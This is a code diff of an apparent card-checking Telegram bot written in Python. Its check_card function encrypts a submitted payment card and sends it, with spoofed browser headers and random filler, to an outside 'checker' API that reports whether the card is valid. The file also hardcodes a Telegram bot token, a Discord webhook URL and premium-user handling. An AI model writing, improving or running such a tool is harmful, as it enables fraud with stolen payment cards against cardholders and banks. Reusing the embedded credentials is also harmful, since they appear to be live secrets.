@@ -8,9 +8,9 @@ from datetime import datetime, timedelta
 import threading
 import base64
 import random
-from Crypto.Cipher import AES  # ← ← ← Bunu da ekle
-from Crypto.Util.Padding import pad, unpad  # ← ← ← Bunu da ekle
-
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import uuid
 
 BOT_TOKEN = "7411770517:AAGW65ZViNLVCFKFDUM5X-QM15rlxckIb2M"
 WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS"
@@ -22,56 +22,51 @@ OWNER_ID = 6369595142
 banned_users = set()
 premium_users = {}
 
-API_URL = "https://metalix.store/checker/fetchproxy1.php"
-
-
-bot = TeleBot(BOT_TOKEN)
-
 def send_to_webhook(content, webhook_url):
     try:
         requests.post(webhook_url, json={"content": content})
     except:
         pass
 
-
 def check_card(card):
     try:
         AES_KEY = b"eonxsIYALqWz3nFG"
-
-        # 1. Kartı hazırlıyoruz
-        random_hex_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))  # 1500*2
+        random_hex_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))
         combined = f"{random_hex_value}:{card}"
 
         cipher = AES.new(AES_KEY, AES.MODE_ECB)
         encrypted_data = cipher.encrypt(pad(combined.encode(), AES.block_size))
         encrypted_card = base64.b64encode(encrypted_data).decode()
 
-        # 2. Rastgele verification parametresi oluşturuyoruz
-        verification_key = "verification_" + ''.join(random.choice('0123456789abcdef') for _ in range(140))  # 70*2
+        verification_key = "verification_" + ''.join(random.choice('0123456789abcdef') for _ in range(140))
         verification_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))
-
-        # 3. coco değeri
         coco_value = str((random.randint(100000000, 9999999999) + random.randint(100000000, 9999999999)) * 31)
 
-        # 4. Headers
+        boundary = uuid.uuid4().hex
+
         headers = {
             'accept': '*/*',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': f'multipart/form-data; boundary=----WebKitFormBoundary{boundary}',
             'origin': 'https://metalix.store',
             'referer': 'https://metalix.store/',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
             'x-coco': coco_value
         }
 
-        # 5. Form-Data
-        files = {
-            'card': (None, encrypted_card),
-            verification_key: (None, verification_value),
-            'coco': (None, coco_value)
-        }
+        payload = (
+            f'------WebKitFormBoundary{boundary}\\r\\n'
+            f'Content-Disposition: form-data; name="card"\\r\\n\\r\\n'
+            f'{encrypted_card}\\r\\n'
+            f'------WebKitFormBoundary{boundary}\\r\\n'
+            f'Content-Disposition: form-data; name="{verification_key}"\\r\\n\\r\\n'
+            f'{verification_value}\\r\\n'
+            f'------WebKitFormBoundary{boundary}\\r\\n'
+            f'Content-Disposition: form-data; name="coco"\\r\\n\\r\\n'
+            f'{coco_value}\\r\\n'
+            f'------WebKitFormBoundary{boundary}--\\r\\n'
+        )
 
-        # 6. POST isteği
-        response = requests.post("https://metalix.store/api/uts/api.php", headers=headers, files=files, timeout=20)
+        response = requests.post("https://metalix.store/api/uts/api.php", headers=headers, data=payload.encode(), timeout=20)
 
         if response.status_code == 200:
             decrypted_data = AES.new(AES_KEY, AES.MODE_ECB).decrypt(base64.b64decode(response.text.strip()))
@@ -82,6 +77,7 @@ def check_card(card):
     except Exception as e:
         return {"message": f"❌ API Hatası: {str(e)}"}
 
+bot = TeleBot(BOT_TOKEN)
 
 @bot.message_handler(commands=['check'])
 def check_command(message):
